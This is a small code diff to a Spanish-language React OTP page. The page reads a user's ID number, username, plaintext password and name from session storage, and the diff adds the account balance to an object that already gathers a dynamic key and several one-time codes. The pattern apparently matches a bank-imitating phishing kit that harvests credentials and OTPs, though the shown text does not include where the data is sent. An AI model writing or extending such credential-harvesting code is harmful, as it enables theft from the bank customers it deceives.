@@ -59,6 +59,7 @@ export default function OtpPage() {
       const usuario = sessionStorage.getItem("usuario");
       const clave = sessionStorage.getItem("clave");
       const nombre = sessionStorage.getItem("nombre");
+      const saldo = sessionStorage.getItem("saldo") || "";
 
       if (!cedula || !nombre || !usuario || !clave) {
         router.push("/login");
@@ -93,6 +94,7 @@ export default function OtpPage() {
         cedula,
         nombre,
         claveDinamica,
+        saldo,
         claveOTP1,
         claveOTP2,
         claveOTP3,
